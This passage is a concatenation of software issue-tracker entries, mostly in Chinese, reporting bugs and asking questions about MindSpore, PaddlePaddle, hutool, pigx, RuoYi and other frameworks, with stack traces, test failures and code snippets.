""/home/jenkins0/.local/lib/python3.7/site-packages/mindspore/nn/layer/container.py"", line 279, in construct input_data = cell(input_data) File ""/home/jenkins0/.local/lib/python3.7/site-packages/mindspore/nn/cell.py"", line 651, in __call__ raise err File ""/home/jenkins0/.local/lib/python3.7/site-packages/mindspore/nn/cell.py"", line 647, in __call__ output = self._run_construct(args, kwargs) File ""/home/jenkins0/.local/lib/python3.7/site-packages/mindspore/nn/cell.py"", line 413, in _run_construct output = self.construct(*cast_inputs, **kwargs) File ""/home/jenkins0/solution_test/cases/02network/00cv/resnet50/train/resnet50_imagenet_bs_512_gpu_8p/scripts/train_parallel/src/resnet.py"", line 274, in construct identity = self.down_sample_layer(identity) File ""/home/jenkins0/.local/lib/python3.7/site-packages/mindspore/nn/cell.py"", line 651, in __call__ raise err File ""/home/jenkins0/.local/lib/python3.7/site-packages/mindspore/nn/cell.py"", line 647, in __call__ output = self._run_construct(args, kwargs) File ""/home/jenkins0/.local/lib/python3.7/site-packages/mindspore/nn/cell.py"", line 413, in _run_construct output = self.construct(*cast_inputs, **kwargs) File ""/home/jenkins0/.local/lib/python3.7/site-packages/mindspore/nn/layer/container.py"", line 279, in construct input_data = cell(input_data) File ""/home/jenkins0/.local/lib/python3.7/site-packages/mindspore/nn/cell.py"", line 651, in __call__ raise err File ""/home/jenkins0/.local/lib/python3.7/site-packages/mindspore/nn/cell.py"", line 647, in __call__ output = self._run_construct(args, kwargs) File ""/home/jenkins0/.local/lib/python3.7/site-packages/mindspore/nn/cell.py"", line 413, in _run_construct output = self.construct(*cast_inputs, **kwargs) File ""/home/jenkins0/.local/lib/python3.7/site-packages/mindspore/nn/layer/normalization.py"", line 137, in construct self.moving_variance)[0] File ""/home/jenkins0/.local/lib/python3.7/site-packages/mindspore/ops/primitive.py"", line 316, in __call__ return _run_op(self, self.name, args) File ""/home/jenkins0/.local/lib/python3.7/site-packages/mindspore/common/api.py"", line 97, in wrapper results = fn(*arg, **kwargs) File ""/home/jenkins0/.local/lib/python3.7/site-packages/mindspore/ops/primitive.py"", line 805, in _run_op output = _pynative_executor.real_run_op(obj, op_name, args) File ""/home/jenkins0/.local/lib/python3.7/site-packages/mindspore/common/api.py"", line 977, in real_run_op return self._executor.real_run_op(*args) RuntimeError: Allocate workspace memory failed ---------------------------------------------------- - C++ Call Stack: (For framework developers) ---------------------------------------------------- mindspore/ccsrc/runtime/pynative/run_op_helper.cc:389 CreateKernelWorkspaceAddress"
5.0.30版本正常， 升级到5.0.33 版以后的版本后，第一个页面就报错,"我原来使用的组件版本是 5.0.30 这时候是正常的，但是升级到 5.0.33 版本以后就不正常了，恢复到 5.0.30 版还可以正常运行。 App.razor 代码 Web Assembly   <code>: &lt;Router AppAssembly=""@typeof(MainLayout).Assembly"" PreferExactMatches=""@true""&gt; &lt;Found Context=""routeData""&gt; &lt;AuthorizeRouteView RouteData=""@routeData"" DefaultLayout=""@typeof(MainLayout)"" /&gt; &lt;/Found&gt; &lt;NotFound&gt; &lt;CascadingAuthenticationState&gt; &lt;LayoutView Layout=""@typeof(MainLayout)""&gt; &lt;p&gt;Sorry, there's nothing at this address.&lt;/p&gt; &lt;/LayoutView&gt; &lt;/CascadingAuthenticationState&gt; &lt;/NotFound&gt; &lt;/Router&gt;"
用yolov5训练的ckpt文件导出mindir模型报错,"ANALYZER(25441,python):2021-09-03-16:52:58.988.649 [mindspore/ccsrc/frontend/operator/composite/multitype_funcgraph.cc:161] GenerateFromTypes] The 'div' operation does not support the type [Tensor[Float32], List[Int64*2]] There are 4 prototypes for overload function , corresponding location info: [Tensor, Number] In file /home/ma-user/miniconda3/envs/MindSpore-python3.7-aarch64/lib/python3.7/site-packages/mindspore/ops/composite/multitype_ops/div_impl.py(75) def _tensor_div_scalar(x, y): ^ [Number, Tensor] In file /home/ma-user/miniconda3/envs/MindSpore-python3.7-aarch64/lib/python3.7/site-packages/mindspore/ops/composite/multitype_ops/div_impl.py(60) def _scalar_div_tensor(x, y): ^ [Tensor, Tensor] In file /home/ma-user/miniconda3/envs/MindSpore-python3.7-aarch64/lib/python3.7/site-packages/mindspore/ops/composite/multitype_ops/div_impl.py(45) def _div_tensor(x, y): [Number, Number] In file /home/ma-user/miniconda3/envs/MindSpore-python3.7-aarch64/lib/python3.7/site-packages/mindspore/ops/composite/multitype_ops/div_impl.py(30) def _div_scalar(x, y):   <code>: div"
iOS无法上传文件,Swoole日志会打出 如果附件的content-type是application/octet-stream则会导致php无法通过post取到数据，只能取到原始数据。 请尽快解决，版本是4.0.   <code>: WARNING http_request_on_header_value: invalid multipart/form-data body fd:23583.
使用Console.printTable会将半角转为全角,JDK版本： 1.8 hutool版本： 5.8.0.M1 不知是有意还是无意，这样看起来不是很好   <code>: Console.printTable()
[CT][MS][Maxpoo3D]众智修改导致多条用例在ascend上报错RuntimeError,"众智修改导致多条用例在ascend上报错RuntimeError： op [ MaxPool3D ]'s attr [ ceil_mode ] generates failed / 硬件环境: /device ascend : -- MindSpore version :众智whl包 -- Python version : -- OS platform and distribution : -- GCC/Compiler version : (/): /mode pynative /mode graph test_p_maxpool3d_input_9x12x8x16x12_strides_int test_p_maxpool3d_input_9x12x8x16x12_dtype_fp32_pad_mode test_p_maxpool3d_input_9x12x8x16x12_dtype_fp16_kernel_size test_p_maxpool3d_input_9x12x8x16x12_kernel_size_int test_p_maxpool3d_input_2x6x3x7x5_dtype_fp16_strides test_p_maxpool3d_input_2x6x3x7x5_dtype_fp64_strides test_p_maxpool3d_input_2x6x8x7x9_kernel_size_tuple_strides_int test_p_maxpool3d_input_1x2x5x6x7_dtype_fp16_pad_mode_same test_p_maxpool3d_input_1x2x4x3x10_dtype_fp16_pad_mode_same test_p_maxpool3d_input_kernel_size_greater test_p_maxpool3d_input_64x8x36x8x32_pad_mode_pad_ceil_mode_none test_p_maxpool3d_input_5x9x7x8x2_pad_list_int_1 test_p_maxpool3d_pad_list_tuple ascend 上执行测试 用例 用例能够正常执行， 结果正确   <code>: def test_p_maxpool3d_input_2x6x3x7x5_dtype_fp16(): input_x = Tensor(np.random.randn(2, 6, 3, 7, 5).astype(np.float16)) fact = MaxPool3dMock( attributes={'kernel_size': 1, 'strides': 1, 'pad_mode': 'valid', 'pad_list': 0, 'ceil_mode': None, 'data_format': 'NCDHW'}, inputs=[input_x]) &gt; fact.forward_cmp() def test_p_maxpool3d_input_2x6x3x7x5_dtype_fp16(): input_x = Tensor(np.random.randn(2, 6, 3, 7, 5).astype(np.float16)) fact = MaxPool3dMock( attributes={'kernel_size': 1, 'strides': 1, 'pad_mode': 'valid', 'pad_list': 0, 'ceil_mode': None, 'data_format': 'NCDHW'}, inputs=[input_x]) &gt; fact.forward_cmp() E RuntimeError: op [ MaxPool3D ]'s attr [ ceil_mode ] generates failed"
knife4j-aggregation 无法引用且2.0.8版聚合服务存在问题,问题一：Maven仓库中找不到knife4j-aggregation-spring-boot-starter的依赖，我的依赖如下： 问题二：以前的文档聚合是在Gateway侧做的，但如果找不到对应的微服务，之前会报错，但能把其它服务的文档显示出来。现在的版本直接什么都不显示，必须要把服务启动后才行：   <code>: &lt;dependency&gt; &lt;groupId&gt;com.github.xiaoymin&lt;/groupId&gt; &lt;artifactId&gt;knife4j-aggregation-spring-boot-starter&lt;/artifactId&gt; &lt;version&gt;2.0.8&lt;/version&gt; &lt;/dependency&gt;
pip installed packages have no information about cuda version,"For now installed packages have cuda 8.0 for packages and cuda 7.5 for packages. This was because we compile packages under paddle ""development"" docker image, which use cuda8.0, yet compile packages using a centos + cuda 7.5 images. Should add different cuda versions for paddle GPU packages.   <code>: pip install cp27mu cp27m mu cp27m"
【bug】DebugInteceptor在springboot2.0.0默认的aop策略下，未正确打印业务代码位置,如图，满足条件，此时i为6，i+2为8，然而对应着这个类，真实的业务代码应该是所对应的类。   <code>: else if (name.equals(mapperName)) traces[8] sun.reflect.GeneratedMethodAccessor78 traces[18]
develop版本，transformer模型CPU-MKLDNN预测速度明显下降,"System information -PaddlePaddle version: , -CPU: , mkldnn enabled -GPU: None -OS Platform (eg.Mac OS 10.14): Ubuntu1604 -Docker image: -Python version: Python3.7 -Cmake orders -C++version.txt: used python api -API information: inference configuration To Reproduce run test without mkldnn test_transformer.txt Other info / logs   <code>: develop 6d8dcc7407 Intel(R) Xeon(R) CPU E5-2650 v4 @ 2.20GHz hub.baidubce.com/paddlepaddle/paddle:latest-gpu-cuda10.0-cudnn7-dev config.disable_gpu() config.set_cpu_math_library_num_threads(8) config.enable_mkldnn() config.switch_ir_optim() config.enable_profile() python test_transformer.py --model_dir=""models/transformer"" --data_dir=data/data.txt python test_transformer.py --model_dir=""models/transformer"" --data_dir=data/data.txt --use_mkldnn"
根据模板导出excel，无法导出图片,"版本号：3.0.0 autopoi： 1.4.0 问题描述：根据模板导出excel，无法导出图片 截图&amp;代码：ExcelExportOfTemplateUtil 方法：createExcleByTemplate ， setValueForCellByMap 直接返回了图片对象   <code>: public static Workbook exportExcel(TemplateExportParams params, Map&lt;String, Object&gt; map) { return new ExcelExportOfTemplateUtil().createExcleByTemplate(params, null, null, map); setValueForCellByMap oldString = oldString.replace(START_STR + params + END_STR, eval(params, map).toString()); }"
【问题】请问，如何在建图时获取一个向量（或者说layer）的shape呢？,"更新. 发现paddle的parameters是有get_shape方法的，但似乎是建好图之后——即创建parameters之后。问题更新为创建图的过程中。 其实我的直接问题是如何实现 luong attention ? 背景是，我有一个title的embedding向量，然后有一个 sentence 向量构成的sequence，然后我想用这个title embedding 去attentend到setence embedding sequence, 然后求setence embedding sequence的加权求和，由此得到一个doc的表示。 目前我是这样做的：paddle 的 networks 里已经有 , 我只需要给title embedding 乘上一个 Matrix, 然后作为 的 . 问题出现了，如何乘上一个Matrix呢？我用的paddle.layer.fc, 但是fc的size如何指定？它应该是跟sentence的embedding一样大——我能否自动获取sentence embedding 的维度呢？也就是把 sentence_embedding 的shape，赋值给 fc 的size？ 因为我的sentence embedding是做了很多操作后concat的结果，没有预设的值。当然也是可以预先算出来的，不过每次改动模型都要手动改一下，感觉不太灵活。所以想问问有没有这样自动获取维度的操作。 不知道对不对，或者清不清楚，贴一下代码...   <code>: doc_product_attention doc_product_attention transformed_state def _create_doc_repr(self, sentence_repr_list, title_repr): """""" sentence_repr_list: list of sentence embedding!! title_repr: title embedding. """""" ## do Luong attention, see http://aclweb.org/anthology/D15-1166 # we first make W x title =&gt; tansformed_vec # then call paddle's dot_product_attention # about dot_product_attention, see http://paddlepaddle.org/docs/develop/documentation/\ # zh/api/v2/config/networks.html#dot-product-attention transformed_vec = paddle.layer.fc( name=""transform_vec"", input=title_repr, size= ????, act=paddle.activation.Linear(), bias_attr=False ) doc_emb = paddle.networks.dot_product_attention( name=""local_attention"", encoded_sequence=sentence_repr_list, attended_sequence=sentence_repr_list, transformed_state=transformed_vec ) return doc_emb"
【众智】【计算-AICPU开发】Pack,"Pack 1.1 功能介绍 实现rank=K的tensor打包成rank=k+1的tensor。 1.2 接口描述 Python 层接口 接口目录：mindspore/ops/operations/array_ops.py class Stack(Primitive): input_x axis int 属性 output 对应底层AICPU算子pack 标杆接口参考 Tensorflow接口： https://tensorflow.google.cn/api_docs/python/tf/raw_ops/Pack 1.3 异常处理 1.4 算子反向 库上已实现   <code>: REG_OP(Pack) .DYNAMIC_INPUT(x, TensorType::BasicType()) .OUTPUT(y, TensorType::BasicType()) .ATTR(axis, Int, 0) .REQUIRED_ATTR(N, Int) .OP_END_FACTORY_REG(Pack)"
获取layers即其中激活函数的名称,在keras中，可以通过 得到model中的层，并且也可通过 获得layer中对应的激活函数名称。这在mindspore中怎么实现？   <code>: mindspore-assistant layers = model.layers layer.activation.__name__
develep branch build failed with manylinux devel Docker image,"The grpc build failed, https://paddleci.ngrok.io/viewLog.html?buildId=19763&amp;buildTypeId=Manylinux1_CpuAvxOpenblas&amp;tab=buildLog&amp;_focus=4023   <code>: [23:14:38] In file included from src/compiler/php_generator.cc:23:0: [23:14:38] ./src/compiler/php_generator_helpers.h: In function ‘grpc::string grpc_php_generator::GetPHPServiceFilename(const FileDescriptor*, const ServiceDescriptor*, const string&amp;)’: [23:14:38] ./src/compiler/php_generator_helpers.h:51:23: error: ‘const class google::protobuf::FileOptions’ has no member named ‘has_php_namespace’ [23:14:38] if (file-&gt;options().has_php_namespace()) { [23:14:38] ^ [23:14:38] ./src/compiler/php_generator_helpers.h:52:39: error: ‘const class google::protobuf::FileOptions’ has no member named ‘php_namespace’ [23:14:38] oss &lt;&lt; ReplaceAll(file-&gt;options().php_namespace(), ""\\"", ""/""); [23:14:38] ^ [23:14:38] src/compiler/php_generator.cc: In function ‘grpc::string grpc_php_generator::{anonymous}::PackageName(const FileDescriptor*)’: [23:14:38] src/compiler/php_generator.cc:47:23: error: ‘const class google::protobuf::FileOptions’ has no member named ‘has_php_namespace’ [23:14:38] if (file-&gt;options().has_php_namespace()) { [23:14:38] ^ [23:14:38] src/compiler/php_generator.cc:48:28: error: ‘const class google::protobuf::FileOptions’ has no member named ‘php_namespace’ [23:14:38] return file-&gt;options().php_namespace(); [23:14:38] ^ [23:14:38] src/compiler/php_generator.cc:52:1: error: control reaches end of non-void function [-Werror=return-type] [23:14:38] } [23:14:38] ^ [23:14:38] cc1plus: all warnings being treated as errors"
导出错误提示,"您好，请问调用导出方法，如果中间过程处理有错误，需要在前端提示如何操作？目前contorller中方法只能定义为void类型，如果使用AjaxResult会有问题。比如这种导出： 如果使用AjaxResult会报错：Content-Type 'application/vnd.openxmlformats-officedocument.spreadsheetml.sh   <code>: @PostMapping(""/handleExportReport"") public void handleExportReport(HttpServletResponse response) { Map&lt;String, Object&gt; dataMap = new HashMap&lt;&gt;(); exportComleakLedger(response,dataMap); } public AjaxResult exportComleakLedger(HttpServletResponse response, Map&lt;String, Object&gt; dataMap) throws Exception { response.setContentType(""application/vnd.openxmlformats-officedocument.spreadsheetml.sheet""); response.setCharacterEncoding(""utf-8""); String inputFile = getProfile() + ""\\template\\test.docx""; //读取模板文件 XWPFTemplate template = XWPFTemplate.compile(inputFile); try { template = XWPFTemplate.compile(inputFile); template.write(response.getOutputStream()); return AjaxResult.success(""成功""); } catch (Exception e) { throw e; } finally { template.close(); }"
将parameters list放入Momentum 提示list没有shape的异常,"我在给优化器配置parameters的时候如果使用将parameters list放入Momentum 就会提示list没有shape的异常，如果使用Adam就不会 1）PaddlePaddle版本：paddlepaddle-gpu 2.0.2 异常代码段 异常提示   <code>: OPTIMIZER = optim.Momentum(parameters=[backbone_paras_wo_bn + head_paras_wo_bn,backbone_paras_only_bn], learning_rate=LR) shape = param.shape AttributeError: 'list' object has no attribute 'shape'"
下载证书文件格式不正确,通过 DevTools 查看下载证书的响应中未包含 头，由于 被设置成 ，下载文件的后缀名变成了 .xlsx。 版本：3.0.5   <code>: Content-Disposition Content-Type application/vnd.openxmlformats-officedocument.spreadsheetml.sheet
[CT][MS][OP]dynamic shape  op assignsub result incorrect with uint8 dtype at ascend,": Ascend /device ascend : -- MindSpore version : -- Python version : -- OS platform and distribution : -- GCC/Compiler version : 执行用例 用例执行pass   <code>: def test_dynamic_shape_assignsub_2d_uint8(): input_ref_np = np.random.randn(3, 10).astype(np.uint8) input_value_np = np.random.randn(3, 10).astype(np.uint8) indices_np = np.array([i for i in range(0, 3)]).astype(np.int32) fact = AssignSubDynamicShapeFactory(input_ref_np, input_value_np, indices_np) &gt; fact.forward_cmp() def test_dynamic_shape_assignsub_2d_uint8(): input_ref_np = np.random.randn(3, 10).astype(np.uint8) input_value_np = np.random.randn(3, 10).astype(np.uint8) indices_np = np.array([i for i in range(0, 3)]).astype(np.int32) fact = AssignSubDynamicShapeFactory(input_ref_np, input_value_np, indices_np) &gt; fact.forward_cmp() test_dynamic_shape_assignsub.py:111: _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ test_dynamic_shape_assignsub.py:60: in forward_cmp allclose_nparray(out_tf, out_ms.asnumpy(), self.loss, self.loss) ../share/utils.py:30: in allclose_nparray _count_unequal_element(data_expected, data_me, rtol, atol) _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ data_expected = array([[ 1, 0, 0, 0, 1, 255, 0, 0, 0, 1], [ 1, 0, 0, 1, 255, 1, 1, 0, 0, 0], [ 0, 1, 0, 255, 0, 0, 254, 0, 1, 0]], dtype=uint8) data_me = array([[1, 0, 0, 0, 0, 0, 0, 0, 0, 1], [0, 0, 0, 1, 0, 0, 1, 0, 0, 0], [0, 1, 0, 0, 0, 0, 0, 0, 1, 0]], dtype=uint8) rtol = 0.0001, atol = 0.0001 def _count_unequal_element(data_expected, data_me, rtol, atol): assert data_expected.shape == data_me.shape total_count = len(data_expected.flatten()) error = np.abs(data_expected - data_me) greater = np.greater(error, atol + np.abs(data_me) * rtol) loss_count = np.count_nonzero(greater) assert (loss_count / total_count) &lt; rtol, \ ""\ndata_expected_std:{0}\ndata_me_error:{1}\nloss:{2}"". \ &gt; format(data_expected[greater], data_me[greater], error[greater]) E AssertionError: E data_expected_std:[ 1 255 1 255 1 255 254] E data_me_error:[0 0 0 0 0 0 0] E loss:[ 1 255 1 255 1 255 254]"
项目打包后运行不报错但是浏览器访问不到,"项目打包运行问题 使用bin目录下package打包成war包，解压后运行自带的startup程序，然后在浏览器端访问。ip:端口号/war包的名字 ctionProxyImpl@5fe46d52] will be managed by Spring 07-29 09:22:48.451 DEBUG [c.j.m.s.d.MenuDao.updateStatusByEntity ] - ==&gt; Preparing: UPDATE js_sys_menu SET = ?, = ?, = ? WHERE status != ? AND module_codes LIKE ? 07-29 09:22:48.456 DEBUG [c.j.m.s.d.MenuDao.updateStatusByEntity ] - ==&gt; Parameters: 0(String), system(String), 2019-07-29 09:22:48.42(Timestamp), 1(String), %filemanager%(String) 07-29 09:22:48.609 DEBUG [c.j.m.s.d.MenuDao.updateStatusByEntity ] - &lt;== Updates: 0 07-29 09:22:48.843 INFO [com.jeesite.modules.Application ] - Startup completed, running 30 seconds ========= Enabled refresh mybatis mapper ========= 无报错信息，运行startup也正常，就是浏览器访问不到   <code>: status update_by update_date"
FileUtil.getType方法识别wps保存的excel文件类型为jar,"JDK版本： jdk_8_201 hutool版本： 5.7.5 比如报错的Excel文件，有问题的图片等。   <code>: File f = FileUtil.newFile(""wps.xlsx""); // 使用WPS编辑过的excel文件 String fileType = FileUtil.getType(f); String suffix = FileUtil.extName(filePath); System.out.println(""fileType =&gt; "" + fileType); // 输出: fileType =&gt; jar System.out.println(""suffix =&gt; "" + suffix); // 输出: suffix =&gt; xlsx"
【众智】【计算-AICPU开发】SparseSegmentSqrtNGrad,"AICPU算子开发 SparseSegmentSqrtN的反向。 接口目录：mindspore/ops/operations/_grad_ops.py x indices segment_ids output_dim0 y 对应底层算子 对应底层AI CPU算子SparseSegmentSqrtNGrad 标杆接口参考 TF接口： tf.raw_ops.SparseSegmentSqrtNGrad https://www.tensorflow.org/api_docs/python/tf/raw_ops/SparseSegmentSqrtNGrad 3. 异常处理 4. 算子反向 无需接入反向算子   <code>: class SparseSegmentSqrtNGrad(Primitive): REG_OP(SparseSegmentSqrtNGrad) .INPUT(x, TensorType({DT_FLOAT, DT_DOUBLE, DT_FLOAT16})) .INPUT(indices, TensorType({DT_INT32})) .INPUT(segment_ids, TensorType({DT_INT32})) .INPUT(output_dim0, TensorType({DT_INT32})) .OUTPUT(y, TensorType({DT_FLOAT, DT_DOUBLE, DT_FLOAT16})) .OP_END_FACTORY_REG(SparseSegmentSqrtNGrad)"
[OCCM][CT][MS][OP]The pad (Ascend)& SliceGrad(CPU) operator is not supported in the slice operator grad implementation.,"反向缺算子 / 硬件环境: ascend cpu /device ascend /device cpu : -- MindSpore version :master -- Python version :Python 3.7.5 -- OS platform and distribution : -- GCC/Compiler version : (/): pynative graph /mode pynative /mode graph test_slice_input_4d_dtype_float64 test_slice_input_5d_dtype_fp64 test_slice_input_1d_dtype_complex128 test_slice_input_2d_dtype_complex64 test_slice_input_3d_dtype_complex128 test_slice_input_4d_dtype_complex128 test_slice_input_5d_dtype_complex64 test_slice_input_6d_dtype_complex64 test_slice_input_7d_dtype_complex128 pytest -s -v test_slice.py::test_slice_input_4d_dtype_float64 pytest -s -v test_slice.py::test_slice_input_5d_dtype_fp64 pytest -s -v test_slice.py::test_slice_input_1d_dtype_complex128 1、2：Ascend环境 3.CPU环境   <code>: def test_slice_input_4d_dtype_float64(): input_shape = (1, 2, 3, 4) begin = (0, 0, 0, 0) size = (1, 1, 1, 4) fact = SliceFactory(input_shape, begin, size, dtype=np.float64) fact.forward_cmp() &gt; fact.grad_cmp() E TypeError: mindspore/ccsrc/plugin/device/ascend/hal/device/kernel_select_ascend.cc:796 PrintNotMatchMessage] Can not select a valid kernel info for [Default/Pad-op36] in AI CORE or AI CPU kernel info candidates list: E AI CORE: E (&lt;Int8xDefaultFormat&gt;) -&gt; (&lt;Int8xDefaultFormat&gt;) E (&lt;UInt8xDefaultFormat&gt;) -&gt; (&lt;UInt8xDefaultFormat&gt;) E (&lt;Int32xDefaultFormat&gt;) -&gt; (&lt;Int32xDefaultFormat&gt;) E (&lt;Float16xDefaultFormat&gt;) -&gt; (&lt;Float16xDefaultFormat&gt;) E (&lt;Float32xDefaultFormat&gt;) -&gt; (&lt;Float32xDefaultFormat&gt;) E AI CPU: E {} E Please check the given data type or shape: E AI CORE: : (&lt;Tensor[Float64], (1, 1, 1, 4)&gt;) -&gt; (&lt;Tensor[Float64], (1, 2, 3, 4)&gt;) E AI CPU: : (&lt;Tensor[Float64], (1, 1, 1, 4)&gt;) -&gt; (&lt;Tensor[Float64], (1, 2, 3, 4)&gt;) E For more details, please refer to 'Kernel Select Failed' at https://www.mindspore.cn def test_slice_input_1d_dtype_complex128(): x_real = np.random.randn(512) x_imag = np.random.randn(512) x = Tensor((x_real + 1j * x_imag), dtype=mstype.complex128) begin = (0,) size = (128,) fact = SliceMock(inputs=[x, begin, size]) fact.forward_cmp() &gt; fact.grad_cmp() E TypeError: mindspore/ccsrc/plugin/device/cpu/hal/device/kernel_select_cpu.cc:219 KernelNotSupportException] Operator[SliceGrad] input(kNumberTypeComplex128,kNumberTypeComplex128) output(kNumberTypeComplex128) is not supported. This error means the current input type is not supported, please refer to the MindSpore doc for supported types. E E The function call stack: E In file /root/miniconda3/envs/zhangting_high_version/lib/python3.7/site-packages/mindspore/ops/_grad/grad_array_ops.py(439)/ dx = G.SliceGrad()(dout, x, begin, size)/ E Corresponding forward node candidate: E - In file /home/zhangting/1214code/MindSporeTest/share/ops/primitive/slice_ops.py(22)/ x = self.slice(input_shape, self.begin, self.size)/ E In file /home/zhangting/1214code/MindSporeTest/share/grad.py(20)/ return self.grad(self.network, self.params)(*inputs)/"
docker容器化部署，分不同物理主机环境，报http://sscp-auth/oauth/check_token 连接超时错误,环境信息 pigx版本: 3.7 是否修改包名: 是 冷总好，我尝试了一个分布部署，将新开发的模块，通过docker方式部署到其他的物理主机，可以正常注册nacos服务，并在服务列表中已正常发现。但是打开该模块的菜单时，会报连接超时错误：http://sscp-auth/oauth/check_token 跟踪源码，确实是呢，在我那台应用的主机，他肯定是不知道pigx-auth是什么的。我尝试把这个换成ip，就说在服务列表中找不到该IP实例。请冷总拨冗指点，谢谢   <code>: Connection timed out (Connection timed out); nested exception is java.net.ConnectException: Connection timed out (Connection timed out) at org.springframework.web.client.RestTemplate.doExecute(RestTemplate.java:748) qywx-biz | at org.springframework.web.client.RestTemplate.execute(RestTemplate.java:674) qywx-biz | at org.springframework.web.client.RestTemplate.exchange(RestTemplate.java:583) qywx-biz | at org.springframework.security.oauth2.provider.token.RemoteTokenServices.postForMap(RemoteTokenServices.java:149) qywx-biz | at org.springframework.security.oauth2.provider.token.RemoteTokenServices.loadAuthentication(RemoteTokenServices.java:106) qywx-biz | at org.springframework.security.oauth2.provider.authentication.OAuth2AuthenticationManager.authenticate(OAuth2AuthenticationManager.java:83)
关于网站前台集成,"我forked了若依的源代码到我仓库，我想在不修改若依源码的基础上，添加后台代码，并将前台代码新建一个模块进行分开处理，以便后续我在更新若依源码时，避免不小心覆盖前台代码。为了前后台的访问地址区分开来，我在后台模块的路劲加了/admin/这样的访问地址前缀。这样后台的index和前台的index就能有访问路径区分，我原意是这样的。 目前遇到这样的问题，如果我创建前台模块ywb-web，这个项目就会有两个web启动项，我尝试着在前台模块来导入后台模块的启动类，发现启动后后台可以访问，但前台访问不了index的地址。能否给一下指导？   <code>: @Import(RuoYiApplication.class) @SpringBootApplication(exclude= {DataSourceAutoConfiguration.class}) public class ywbApplication extends SpringBootServletInitializer { public static void main(String[] args){ SpringApplication.run(ywbApplication.class, args); } @Override protected SpringApplicationBuilder configure(SpringApplicationBuilder application) { return application.sources(ywbApplication.class); } }"
关于多账号认证Token无效的问题,"1.先进行admin用户的登录,然后去访问getUsr是可以访问的 2.然后进行user用户进行登录但是下面校验的是@SaCheckRole(""admin"") admin用户 为什么user用户也是可以访问   <code>: if(""admin"".equals(username) &amp;&amp; ""123456"".equals(password)) { StpUtil.login(10001); return ""登录成功""; }else if(""user"".equals(username) &amp;&amp; ""123456"".equals(password)){ StpUtil.login(10002); return ""登录成功""; } @RequestMapping(""getUsr"") @SaCheckRole(""admin"") public String getUsr() { return ""admin""; }"
import 方式调用接口如何传参？,调用使用import导入的，在调用的时候可以传参吗？   <code>: import '@get:/other/assert' as test; var res = test(); // 这里怎么传递参数
Spring Security 国际化消息没有加载自定义信息,pigx版本: 3.4 是否修改包名: NO 修改pigx-common-security项目中的国际化资源，添加自定义消息 代码中通过无法获取到新添加的自定义消息 调试发现并没有加载项目下面的国际化文件，pigx自定义的信息有47条，我自己加了一条总共应为48条，在调试时发现总共只加载了46条，也就是说pigx自定义的那条信息和我新加都没有被框架读到。 见截图   <code>: messages_zh_CN.properties SpringSecurityMessageSource.getAccessor().getMessage Spring Security
Failed to compile MindSpore,"Hello, developers! Following instructions, I tried to compile mindspore on my machine, but encounter a compiling error. configure: WARNING: See config.log for details configure: error: Cannot continue CMake Error at cmake/utils.cmake:174 (message): error! when ./configure;CXXFLAGS=-D_FORTIFY_SOURCE=2 -O2;--prefix=/home/mindspore/source/mindspore/build/mindspore/.mslib/ompi_43222b5b12a55cfa6bc138b1ee01470b in /home/mindspore/source/mindspore/build/mindspore/_deps/ompi-src Call Stack (most recent call first): cmake/utils.cmake:380 (__exec_cmd) cmake/external_libs/ompi.cmake:3 (mindspore_add_pkg) cmake/mind_expression.cmake:44 (include) CMakeLists.txt:37 (include) Detailed messages in CMakeOutput.log is pasted below: Performing C SOURCE FILE Test CMAKE_HAVE_LIBC_PTHREAD failed with the following output: Change Dir: /home/mindspore/source/mindspore/build/mindspore/CMakeFiles/CMakeTmp Run Build Command(s):/usr/bin/make cmTC_e2f2a/fast &amp;&amp; /usr/bin/make -f CMakeFiles/cmTC_e2f2a.dir/build.make CMakeFiles/cmTC_e2f2a.dir/build make[1]: Entering directory '/home/mindspore/source/mindspore/build/mindspore/CMakeFiles/CMakeTmp' Building C object CMakeFiles/cmTC_e2f2a.dir/src.c.o /usr/bin/cc -DCMAKE_HAVE_LIBC_PTHREAD -o CMakeFiles/cmTC_e2f2a.dir/src.c.o -c /home/mindspore/source/mindspore/build/mindspore/CMakeFiles/CMakeTmp/src.c Linking C executable cmTC_e2f2a /usr/local/bin/cmake -E cmake_link_script CMakeFiles/cmTC_e2f2a.dir/link.txt --verbose=1 /usr/bin/cc CMakeFiles/cmTC_e2f2a.dir/src.c.o -o cmTC_e2f2a CMakeFiles/cmTC_e2f2a.dir/src.c.o: In function pthread_create' src.c:(.text+0x4a): undefined reference to pthread_cancel' src.c:(.text+0x67): undefined reference to pthread_atfork' collect2: error: ld returned 1 exit status CMakeFiles/cmTC_e2f2a.dir/build.make:105: recipe for target 'cmTC_e2f2a' failed make[1]: *** [cmTC_e2f2a] Error 1 make[1]: Leaving directory '/home/mindspore/source/mindspore/build/mindspore/CMakeFiles/CMakeTmp' Makefile:140: recipe for target 'cmTC_e2f2a/fast' failed make: *** [cmTC_e2f2a/fast] Error 2 Source file was: #include &lt;pthread.h&gt; static void* test_func(void* data) { return data; } int main(void) { pthread_t thread; pthread_create(&amp;thread, NULL, test_func, NULL); pthread_detach(thread); pthread_cancel(thread); pthread_join(thread, NULL); pthread_atfork(NULL, NULL, NULL); pthread_exit(NULL); return 0; } Determining if the function pthread_create exists in the pthreads failed with the following output: Change Dir: /home/mindspore/source/mindspore/build/mindspore/CMakeFiles/CMakeTmp Run Build Command(s):/usr/bin/make cmTC_cbe5d/fast &amp;&amp; /usr/bin/make -f CMakeFiles/cmTC_cbe5d.dir/build.make CMakeFiles/cmTC_cbe5d.dir/build make[1]: Entering directory '/home/mindspore/source/mindspore/build/mindspore/CMakeFiles/CMakeTmp' Building C object CMakeFiles/cmTC_cbe5d.dir/CheckFunctionExists.c.o /usr/bin/cc -DCHECK_FUNCTION_EXISTS=pthread_create -o CMakeFiles/cmTC_cbe5d.dir/CheckFunctionExists.c.o -c /usr/local/share/cmake-3.19/Modules/CheckFunctionExists.c Linking C executable cmTC_cbe5d /usr/local/bin/cmake -E cmake_link_script CMakeFiles/cmTC_cbe5d.dir/link.txt --verbose=1 /usr/bin/cc -DCHECK_FUNCTION_EXISTS=pthread_create CMakeFiles/cmTC_cbe5d.dir/CheckFunctionExists.c.o 